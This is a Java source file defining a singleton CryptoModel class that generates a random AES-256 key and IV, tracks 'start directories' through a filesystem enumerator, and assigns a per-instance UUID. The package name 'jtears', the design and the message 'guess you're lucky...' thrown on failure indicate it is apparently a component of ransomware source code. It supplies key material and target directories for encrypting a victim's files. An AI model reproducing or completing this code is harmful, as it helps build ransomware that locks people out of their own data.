package oof.heck.jtears;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;
import java.util.Base64;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;
import java.util.UUID;
import java.util.List;
import java.io.File;

class CryptoModel {

    private static volatile CryptoModel instance = new CryptoModel();

    private SecretKey secretKey;
    private SecureRandom secureRandom;
    private byte[] initialVector;
    private IvParameterSpec ivspec;
    private FsEnumerator fs;
    private final String instanceUuid = UUID.randomUUID().toString();


    private CryptoModel() {

        try {

            this.secureRandom = new SecureRandom();
            this.initialVector = new byte[256/16];
            this.secureRandom.nextBytes(this.initialVector);
            this.ivspec = new IvParameterSpec(this.initialVector);

            KeyGenerator gen = KeyGenerator.getInstance("AES");
            gen.init(256);
            this.secretKey = gen.generateKey();

            this.fs = new FsEnumerator();

        } catch (NoSuchAlgorithmException e) {

            throw new RuntimeException("guess you're lucky...");

        }
    }

    public static CryptoModel getInstance() {

        return instance;

    }

    public SecretKey getSecretKey() {

        return this.secretKey;

    }

    public IvParameterSpec getIvSpec() {

        return this.ivspec;

    }

    public List<File> getStartDirs() {

        return this.fs.getStartDirs();

    }

    public String getUUID() {

        return this.instanceUuid;

    }

}
